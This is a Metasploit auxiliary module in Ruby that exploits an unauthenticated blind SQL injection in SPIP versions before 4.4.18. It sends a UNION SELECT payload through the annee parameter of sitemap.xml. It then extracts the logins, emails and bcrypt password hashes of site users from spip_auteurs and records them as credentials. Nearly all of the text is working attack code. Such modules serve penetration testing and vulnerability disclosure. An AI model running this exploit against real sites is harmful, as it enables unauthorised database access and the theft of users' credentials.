##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Spip
  include Msf::Exploit::SQLi
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SPIP Unauthenticated Blind SQLi via Date Field Escaping Bypass',
        'Description' => %q{
          This module exploits an unauthenticated blind SQL injection in
          SPIP < 4.4.18. The SQL quoting function for date-type columns
          skips escaping when the value matches /^\w+\(/ (intended for
          NOW()). By passing a value like abs(X)) UNION SELECT ... in the
          annee parameter of the public sitemap.xml page, an attacker can
          inject arbitrary SQL.

          The module uses boolean-based blind injection to extract bcrypt
          password hashes from spip_auteurs. A UNION SELECT with a WHERE
          condition produces 2 URLs in the sitemap on TRUE vs 1 on FALSE.
        },
        'Author' => [
          'Benoit Hua',       # Vulnerability discovery
          'ka3n1x',           # Vulnerability discovery
          'Franck Chevalier', # Vulnerability discovery
          'Julien Voisin'     # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-4-18.html']
        ],
        'DisclosureDate' => '2026-08-10',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptInt.new('ID_AUTEUR', [true, 'Target user ID to extract (1 = first admin)', 1]),
      OptInt.new('MAX_USERS', [true, 'Maximum number of users to extract', 5])
    ])
  end

  def run
    rversion = spip_version || spip_plugin_version('spip')
    if rversion
      print_status("SPIP Version detected: #{rversion}")
      if rversion >= Rex::Version.new('4.4.18')
        print_warning('Target appears patched (>= 4.4.18)')
      end
    end

    @sqli = create_sqli(dbms: Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind) do |payload|
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, 'spip.php'),
        'vars_get' => {
          'page' => 'sitemap.xml',
          'annee' => "abs(99999)) UNION SELECT 1,2,3,4,5,6 FROM spip_auteurs WHERE #{payload}--"
        }
      )
      next false unless res&.body

      res.body.scan('<url>').length > 1
    end

    print_status('Verifying blind SQLi via sitemap.xml annee parameter...')
    unless @sqli.test_vulnerable
      fail_with(Failure::NotVulnerable, 'Boolean blind SQLi test failed')
    end
    print_good('Blind SQLi confirmed!')

    max_users = datastore['MAX_USERS']
    start_id = datastore['ID_AUTEUR']

    (start_id..(start_id + max_users - 1)).each do |uid|
      cond = "id_auteur=#{uid}"
      rows = @sqli.dump_table_fields('spip_auteurs', %w[login email pass], cond)
      next if rows.empty?

      login, email, pass = rows.first
      print_good("  Login: #{login}")
      print_good("  Email: #{email}")
      print_good("  Hash:  #{pass}")

      report_cred(login, pass) unless pass.empty?
    end
  end

  def report_cred(login, hash)
    credential_data = {
      module_fullname: fullname,
      workspace_id: myworkspace_id,
      username: login,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: 'bcrypt',
      origin_type: :service,
      address: rhost,
      port: rport,
      protocol: 'tcp',
      service_name: (ssl ? 'https' : 'http')
    }
    create_credential(credential_data)
  end
end
